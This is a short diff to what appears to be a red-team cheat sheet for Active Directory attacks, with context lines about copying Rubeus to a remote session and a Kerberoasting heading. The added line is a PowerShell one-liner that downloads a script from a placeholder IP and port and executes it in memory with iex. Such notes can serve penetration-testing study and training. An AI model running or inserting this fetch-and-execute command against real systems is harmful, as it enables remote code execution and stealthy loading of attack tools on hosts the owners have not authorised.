@@ -237,7 +237,7 @@ Copy-Item -ToSession $appsrv1 -Path C:\AD\Tools\Rubeus.exe -Destination C:\Users
 ```
 # Download and execute script in memory
 ```
-
+iex (New-Object Net.WebClient).DownloadString('http://<IP:PORT>/<script>.ps1')
 ```
 # Kerberoasting - ASK TGS
 
